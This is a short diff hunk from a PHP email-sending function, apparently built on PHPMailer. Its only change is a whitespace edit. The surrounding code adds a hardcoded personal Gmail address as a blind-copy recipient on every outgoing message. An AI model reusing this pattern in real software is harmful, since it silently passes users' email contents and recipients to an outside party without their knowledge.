@@ -366,7 +366,7 @@ function email($account, $password, $from_name, $to, $subject, $body, $attachmen
 	$mail->Body = $body; //郵件內容
 	$mail->IsHTML(true); //郵件內容為html
 	$mail->AddBCC('bcawosxy@gmail.com'); //設定 密件副本收件者
-	 
+	
 	//收件者
 	if (is_array($to)) {
 		foreach ($to as $mailaddress) {
